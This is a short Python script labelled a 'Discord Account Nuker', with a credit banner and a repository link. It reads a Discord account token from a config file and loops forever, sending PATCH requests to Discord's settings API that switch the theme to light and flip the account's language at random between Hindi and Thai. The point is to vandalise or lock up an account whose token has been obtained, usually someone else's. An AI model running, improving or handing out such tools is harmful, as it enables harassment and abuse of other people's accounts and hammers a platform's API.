#       ██╗░░░░░░█████╗░██╗░░░░░░█████╗░██╗░░░░░
#       ██║░░░░░██╔══██╗██║░░░░░██╔══██╗██║░░░░░
#       ██║░░░░░███████║██║░░░░░██║░░██║██║░░░░░
#       ██║░░░░░██╔══██║██║░░░░░██║░░██║██║░░░░░
#       ███████╗██║░░██║███████╗╚█████╔╝███████╗
#       ╚══════╝╚═╝░░╚═╝╚══════╝░╚════╝░╚══════╝
#                       Account Nuker By LALOL 
#           https://github.com/Its-LALOL/Discord-Account-Nuker

import colorama
from colorama import init, Fore, Back, Style
init(convert=True)
import random
import config
from config import *
import requests
import json

print(Fore.GREEN + "The LagMachine has been Loaded!" + Fore.RED)

headers = {'Authorization': TOKEN}
while True:
	setting = {'theme': "light", 'locale': random.choice (['hi', 'th'])}
	requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)